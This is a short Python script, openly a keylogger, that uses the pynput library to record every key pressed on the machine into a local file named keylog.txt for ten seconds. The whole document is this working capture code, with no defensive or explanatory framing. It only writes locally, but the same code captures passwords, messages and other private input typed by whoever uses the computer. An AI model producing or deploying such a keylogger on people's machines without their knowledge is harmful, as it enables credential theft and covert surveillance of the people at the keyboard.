from pynput import keyboard
import time

def on_press(key):
    with open('keylog.txt', 'a') as f:
        f.write(str(key))
        f.write('\n')

def on_release(key):
    pass

def start_keylogger():
    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    keyboard_listener.start()

    # Run the keylogger for 10 seconds
    time.sleep(10)

    keyboard_listener.stop()

if __name__ == '__main__':
    start_keylogger()